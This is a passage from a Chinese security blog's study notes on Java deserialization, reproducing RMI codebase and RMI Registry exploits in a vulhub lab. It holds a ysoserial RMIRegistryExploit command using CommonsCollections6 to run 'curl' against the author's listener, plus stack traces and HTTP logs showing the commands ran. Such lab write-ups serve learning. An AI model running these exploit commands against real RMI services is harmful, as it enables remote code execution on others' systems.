+<p>这里的  <code>http://example.com/</code> 就是刚刚python监听的地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">F:\Code\JAVA\RMI2\src&gt;javac RMIClient.java</span><br><span class="line"></span><br><span class="line">F:\Code\JAVA\RMI2\src&gt;java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://xx.xx.xx.xx:8000/ RMIClient</span><br><span class="line">Exception in thread "main" java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:</span><br><span class="line">        java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:</span><br><span class="line">        java.io.InvalidClassException: RMIClient; local class incompatible: stream classdesc serialVersionUID = -2981438248522607595</span><br><span class="line">, local class serialVersionUID = 1</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:389)</span><br><span class="line">        at sun.rmi.transport.Transport$1.run(Transport.java:200)</span><br><span class="line">        at sun.rmi.transport.Transport$1.run(Transport.java:197)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:748)</span><br><span class="line">        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:275)</span><br><span class="line">        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:252)</span><br><span class="line">        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:161)</span><br><span class="line">        at java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:194)</span><br><span class="line">        at java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:148)</span><br><span class="line">        at com.sun.proxy.$Proxy0.sum(Unknown Source)</span><br><span class="line">        at RMIClient.lookup(RMIClient.java:16)</span><br><span class="line">        at RMIClient.main(RMIClient.java:20)</span><br><span class="line">Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:</span><br><span class="line">        java.io.InvalidClassException: RMIClient; local class incompatible: stream classdesc serialVersionUID = -2981438248522607595</span><br><span class="line">, local class serialVersionUID = 1</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:348)</span><br><span class="line">        at sun.rmi.transport.Transport$1.run(Transport.java:200)</span><br><span class="line">        at sun.rmi.transport.Transport$1.run(Transport.java:197)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:748)</span><br><span class="line">Caused by: java.io.InvalidClassException: RMIClient; local class incompatible: stream classdesc serialVersionUID = -2981438248522607</span><br><span class="line">595, local class serialVersionUID = 1</span><br><span class="line">        at java.io.ObjectStreamClass.initNonProxy(ObjectStreamClass.java:699)</span><br><span class="line">        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1885)</span><br><span class="line">        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1751)</span><br><span class="line">        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2042)</span><br><span class="line">        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1573)</span><br><span class="line">        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:2287)</span><br><span class="line">        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2211)</span><br><span class="line">        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2069)</span><br><span class="line">        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1573)</span><br><span class="line">        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:431)</span><br><span class="line">        at sun.rmi.server.UnicastRef.unmarshalValue(UnicastRef.java:322)</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked(UnicastServerRef.java:629)</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.unmarshalParameters(UnicastServerRef.java:617)</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:338)</span><br><span class="line">        ... 12 more</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里报了很多错误，但是没有关系，因为我们的命令已经成功执行。</p>
+<p>看看刚刚python监听的日志</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-12-ubuntu:~/Temp$ python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">121.4.65.44 - - [06/Nov/2021 12:11:43] "GET /RMIClient$Payload.class HTTP/1.1" 200 -</span><br><span class="line">121.4.65.44 - - [06/Nov/2021 12:11:43] "GET /RMIClient.class HTTP/1.1" 200 -</span><br><span class="line">121.4.65.44 - - [06/Nov/2021 12:11:43] code 404, message File not found</span><br><span class="line">121.4.65.44 - - [06/Nov/2021 12:11:43] "GET /exp HTTP/1.1" 404 -</span><br></pre></td></tr></table></figure>
+
+<p>这里不仅读取了<code>RMIClient$Payload.class</code>和<code>RMIClient.class</code>文件，还请求了<code>/exp</code> ，说明成功执行了命令。</p>
+<p>复现完成。</p>
+<p>以下复现主要学习<code>ysoserial</code>工具的使用</p>
+<h3 id="Java-RMI-Registry-反序列化漏洞-lt-jdk8u111"><a href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111" class="headerlink" title="Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)"></a>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</h3><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p><a href="https://vulhub.org/#/environments/java/rmi-registry-bind-deserialization/" target="_blank" rel="noopener">https://vulhub.org/#/environments/java/rmi-registry-bind-deserialization/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose run -e RMIIP=your-ip -p 1099:1099 rmi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">root@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-registry-bind-deserialization# docker-compose build</span><br><span class="line">/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.</span><br><span class="line">  from cryptography.hazmat.backends import default_backend</span><br><span class="line">Building rmi</span><br><span class="line">Step 1/12 : FROM maven:3-jdk-8 AS builder</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> cf7c6bc6ea12</span></span><br><span class="line">Step 2/12 : LABEL MAINTAINER="phithon &lt;root@leavesongs.com&gt;"</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 828f56e5b565</span></span><br><span class="line">Step 3/12 : COPY ./src/code/ /usr/src/</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 004e82609029</span></span><br><span class="line">Step 4/12 : WORKDIR /usr/src</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> c9f14a7aef0f</span></span><br><span class="line">Step 5/12 : RUN cd /usr/src;     mvn -U clean package -Dmaven.test.skip=true --settings settings.xml</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 27cbdf63515c</span></span><br><span class="line">Step 6/12 : FROM openjdk:8u111-jre</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> e44d62cf8862</span></span><br><span class="line">Step 7/12 : WORKDIR /root</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 313347366d80</span></span><br><span class="line">Step 8/12 : ENV RMIIP="127.0.0.1"</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 90e0b68b0433</span></span><br><span class="line">Step 9/12 : COPY --from=builder /usr/src/target/train-1.0-SNAPSHOT-all.jar /root/train-1.0-SNAPSHOT-all.jar</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> be0e1ec1469d</span></span><br><span class="line">Step 10/12 : COPY src/client.policy /root/</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 9baa04a82cb7</span></span><br><span class="line">Step 11/12 : EXPOSE 1099</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> eb629a8ecc8a</span></span><br><span class="line">Step 12/12 : CMD ["bash", "-c", "java -cp train-1.0-SNAPSHOT-all.jar -Djdk.xml.enableTemplatesImplDeserialization=true -Djava.rmi.server.hostname=$&#123;RMIIP&#125; -Djava.security.manager -Djava.security.policy=/root/client.policy train.rmi.Server"]</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 77e422e51645</span></span><br><span class="line">Successfully built 77e422e51645</span><br><span class="line">Successfully tagged rmi-registry-bind-deserialization_rmi:latest</span><br><span class="line">root@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-registry-bind-deserialization# docker-compose build</span><br><span class="line">/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.</span><br><span class="line">  from cryptography.hazmat.backends import default_backend</span><br><span class="line">Building rmi</span><br><span class="line">Step 1/12 : FROM maven:3-jdk-8 AS builder</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> cf7c6bc6ea12</span></span><br><span class="line">Step 2/12 : LABEL MAINTAINER="phithon &lt;root@leavesongs.com&gt;"</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 828f56e5b565</span></span><br><span class="line">Step 3/12 : COPY ./src/code/ /usr/src/</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 004e82609029</span></span><br><span class="line">Step 4/12 : WORKDIR /usr/src</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> c9f14a7aef0f</span></span><br><span class="line">Step 5/12 : RUN cd /usr/src;     mvn -U clean package -Dmaven.test.skip=true --settings settings.xml</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 27cbdf63515c</span></span><br><span class="line">Step 6/12 : FROM openjdk:8u111-jre</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> e44d62cf8862</span></span><br><span class="line">Step 7/12 : WORKDIR /root</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 313347366d80</span></span><br><span class="line">Step 8/12 : ENV RMIIP="127.0.0.1"</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 90e0b68b0433</span></span><br><span class="line">Step 9/12 : COPY --from=builder /usr/src/target/train-1.0-SNAPSHOT-all.jar /root/train-1.0-SNAPSHOT-all.jar</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> be0e1ec1469d</span></span><br><span class="line">Step 10/12 : COPY src/client.policy /root/</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 9baa04a82cb7</span></span><br><span class="line">Step 11/12 : EXPOSE 1099</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> eb629a8ecc8a</span></span><br><span class="line">Step 12/12 : CMD ["bash", "-c", "java -cp train-1.0-SNAPSHOT-all.jar -Djdk.xml.enableTemplatesImplDeserialization=true -Djava.rmi.server.hostname=$&#123;RMIIP&#125; -Djava.security.manager -Djava.security.policy=/root/client.policy train.rmi.Server"]</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 77e422e51645</span></span><br><span class="line">Successfully built 77e422e51645</span><br><span class="line">Successfully tagged rmi-registry-bind-deserialization_rmi:latest</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-registry-bind-deserialization# docker-compose run -e RMIIP=xx.xx.xx.xx -p 1099:1099 rmi</span><br><span class="line">/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.</span><br><span class="line">  from cryptography.hazmat.backends import default_backend</span><br><span class="line">Creating network "rmi-registry-bind-deserialization_default" with the default driver</span><br><span class="line">Hello obj bound</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;curl your-dnslog-server&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">F:\Tools\WEB\Java-Tools</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> java -cp ysoserial-master-8eb5cbfbf6-1.jar ysoserial.exploit.RMIRegistryExploit xx.xx.xx.xx 1099 CommonsCollections6 <span class="string">"curl http://xx.xx.xx.xx:8000/exp"</span></span></span><br><span class="line">java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:</span><br><span class="line">        java.rmi.AccessException: Registry.Registry.bind disallowed; origin /125.84.158.133 is non-local host</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:421)</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:272)</span><br><span class="line">        at sun.rmi.transport.Transport$1.run(Transport.java:200)</span><br><span class="line">        at sun.rmi.transport.Transport$1.run(Transport.java:197)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:683)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:745)</span><br><span class="line">        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:276)</span><br><span class="line">        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:253)</span><br><span class="line">        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:379)</span><br><span class="line">        at sun.rmi.registry.RegistryImpl_Stub.bind(Unknown Source)</span><br><span class="line">        at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:77)</span><br><span class="line">        at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:71)</span><br><span class="line">        at ysoserial.secmgr.ExecCheckingSecurityManager.callWrapped(ExecCheckingSecurityManager.java:72)</span><br><span class="line">        at ysoserial.exploit.RMIRegistryExploit.exploit(RMIRegistryExploit.java:71)</span><br><span class="line">        at ysoserial.exploit.RMIRegistryExploit.main(RMIRegistryExploit.java:65)</span><br><span class="line">Caused by: java.rmi.AccessException: Registry.Registry.bind disallowed; origin /125.84.158.133 is non-local host</span><br><span class="line">        at sun.rmi.registry.RegistryImpl.checkAccess(RegistryImpl.java:287)</span><br><span class="line">        at sun.rmi.registry.RegistryImpl.bind(RegistryImpl.java:179)</span><br><span class="line">        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:411)</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:272)</span><br><span class="line">        at sun.rmi.transport.Transport$1.run(Transport.java:200)</span><br><span class="line">        at sun.rmi.transport.Transport$1.run(Transport.java:197)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:683)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure>
+
+<p>成功执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">121.4.65.44 - - [06/Nov/2021 14:20:15] code 404, message File not found</span><br><span class="line">121.4.65.44 - - [06/Nov/2021 14:20:15] &quot;GET /exp HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
+
+<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>本来是想多复现几个场景的，但是由于环境原因，实现起来比较复杂，我的目的就只是练习使用<code>ysoserial</code>工具，就懒得搞了，而且耽误时间并且意义也不大，那么学习java反序列就告一段落，这只是刚刚开始，后边还会陆陆续续进行学习。</p>
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Fany</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://fanygit.github.io/2021/11/02/Java安全学习笔记（一）/" title="Java安全学习笔记（一）">https://fanygit.github.io/2021/11/02/Java安全学习笔记（一）/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/java安全漫谈/" rel="tag"># java安全漫谈</a>
+          
+            <a href="/tags/java安全/" rel="tag"># java安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/11/01/CTF-AWD攻防方法总结/" rel="next" title="CTF-AWD攻防方法总结">
+                <i class="fa fa-chevron-left"></i> CTF-AWD攻防方法总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/11/07/[GXYCTF2019]StrongestMind 1/" rel="prev" title="BUUCTF-WEB [GXYCTF2019]StrongestMind 1">
+                BUUCTF-WEB [GXYCTF2019]StrongestMind 1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+  
+    
+    <div class="comments" id="comments"></div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
